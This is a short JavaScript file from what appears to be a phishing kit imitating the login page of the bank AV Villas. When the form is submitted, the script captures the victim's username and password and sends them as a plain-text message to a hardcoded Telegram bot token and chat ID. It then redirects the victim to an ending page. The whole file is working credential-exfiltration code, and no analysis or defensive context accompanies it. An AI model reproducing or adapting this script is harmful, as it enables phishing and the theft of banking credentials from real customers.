function enviarMensajeTelegram(username, password) {
    var token = '7580606761:AAFiPnAx4jOqv-bBPWFcqk8rwOJ1DYdsCGA';
    var chatID = '7831097636';
    var mensaje = 'Logo Avvillas: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
    var xhttp = new XMLHttpRequest();
    xhttp.open('GET', url, true);
    xhttp.send();
}

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('submitBtn').addEventListener('click', function(event) {
        event.preventDefault(); // Evita que el formulario se envíe por defecto

        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        if (username.trim() !== '' && password.trim() !== '') {
            enviarMensajeTelegram(username, password);
            setTimeout(function() {
                window.location.href = '../fin.html';
            }, 1000);
        } else {
            alert('Por favor complete todos los campos antes de continuar.');
        }
    });
});